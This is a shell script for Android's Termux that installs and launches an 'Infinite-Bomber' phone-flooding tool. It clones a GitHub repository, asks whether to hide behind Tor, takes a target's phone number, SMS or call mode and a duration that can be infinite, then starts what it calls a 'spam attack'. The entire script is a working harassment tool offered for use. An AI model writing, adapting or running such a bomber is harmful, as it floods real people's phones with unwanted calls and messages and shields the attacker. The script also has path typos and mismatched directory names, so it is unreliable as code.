toilet andro
toilet SHELL
dirandro="./android"
echo -n "Checking super directory..."
if [ -d $dirandro ]
then
echo done
else
echo -n "Spammer not found. Do you want to install it? [y/n] "
read spam
if [ $spam = y ]
then
apt install git
git clone https://github.com/Argisht44/android.git
else
if [ $spam = n ]
then
echo "OK. Exiting the app..."
exit
else
echo "You have chosen a nonexistent option! Choose y or n!"
fi
fi
fi
cd android
dir21="./Infinite-Bomber-arm64"
dir01=",.Infinite-Bomber-arm"
dir2="./Infinite-Bomber-arm64-without-tor"
dir="./Infinite-Bomber-arm-without-tor"
dir0="./Infinite-Bomber-x86"

echo -n "Checking first directory..."
if [ -d $dir2 ]
then
mv Infinite-Bomber-arm64-without-tor Infinite-Bomber-2-2
echo "done"
else
echo "done"
fi
echo -n "Checking second directory..."
if [ -d $dir ]
then
mv Infinite-Bomber-arm-without-tor Infinite-Bomber-1-2
echo "done"
else
echo "done"
fi
echo -n "Checking third directory..."
if [ -d $dir21 ]
then
mv Infinite-Bomber-arm64 Infinite-Bomber-2-1
echo done
else
echo done
fi
echo -n "Checking fourth directory..."
if [ -d $dir01 ]
then
mv Infinite-Bomber-arm Infinite-Bomber-1-1
echo done
else
echo done
fi
echo -n "Checking head directory..."
if [ -d $dir0 ]
then
echo -n "Which processor do you have?

1) arm

2) arm64

Your choise: "
read proc
echo $proc >> ./proc.tp
if [ $proc = 1 ]
then
echo -n "Are you sure? When arm is selected, the remaining directories are deleted!

1) YES, ARM!
2) NO, OTHER!

Your choise: "
read ch
if [ $ch = 1 ]
then
rm -R Infinite-Bomber-x86
rm -R Infinite-Bomber-x86-without-tor
rm -R Infinite-Bomber-x64
rm -R Infinite-Bomber-x64-without-tor
rm -R Infinite-Bomber-arm64
rm -R Infinite-Bomber-2-without-tor
cd Infinite-Bomber-arm
else
if [ $ch = 2 ]
then
echo "OK"
exit
else
echo "You have chosen a nonexistent option! Choose 1 or 2!"
exit
fi
fi
fi
if [ $proc  = 2 ]
then
echo -n "Are you sure? When arm64 is selected, the remaining directories are deleted!

1) YES, ARM64!
2) NO, OTHER!

Your choise: "
read ch
if [ $ch = 1 ]
then
rm -R Infinite-Bomber-x86
rm -R Infinite-Bomber-x86-without-tor
rm -R Infinite-Bomber-x64
rm -R Infinite-Bomber-x64-without-tor
rm -R Infinite-Bomber-arm
rm -R Infinite-Bomber-1-without-tor
cd Infinite-Bomber-arm64
else
if [ $ch = 2 ]
then
echo "OK"
exit
else
echo "You have chosen a nonexistent option! Choose 1 or 2!"
exit
fi
fi
else
echo "You have chosen a nonexistent option! Choose 1 or 2!"
exit
fi
else
echo done
fi
echo
echo -n "Will you use Tor?

1) Yes

2) No

Your choise: "
read tor
if [ $tor = 2 ]
then
echo
echo "You are not safe!"
else
if [ $tor = 1 ]
then
echo
echo "You are safe!"
else
echo "You have chosen a nonexistent option! Choose 1 or 2!"
exit
fi
fi
echo
echo "Target's phone number? (example: 79123456789) "
read phon
echo
echo -n "Mode?

1) SMS

2) CALL

3)SMS&CALL

Your choise: "
read mod
if [ $mod = 1 ]
then
echo OK
else
if [ $mod = 2 ]
then
echo OK
else
if [ $mod = 3 ]
then
echo OK
else
echo "You have chosen a nonexistent option! Choose 1, 2 or 3!"
exit
fi
fi
fi
echo
echo -n "Log?

1) OK

2) ERR

3) OK&ERR

Your choise: "
read log
if [ $log = 1 ]
then
echo OK
else
if [ $log = 2 ]
then
echo OK
else
if [ $log = 3 ]
then
echo OK
else
echo "You have chosen a nonexistent option! Choose 1, 2 or 3!"
exit
fi
fi
fi
echo
echo -n "Time? (0 is infinite): "
read tim
echo "Spam attack started succesfully! :)"
cat /data/data/com.termux/files/home/proc.tp | while read proc
do
cd /data/data/com.termux/files/home/android/Infinite-Bomber-$proc-$tor
chmod +x infinite-bomber
./infinite-bomber $phon $mod $log $tim
done
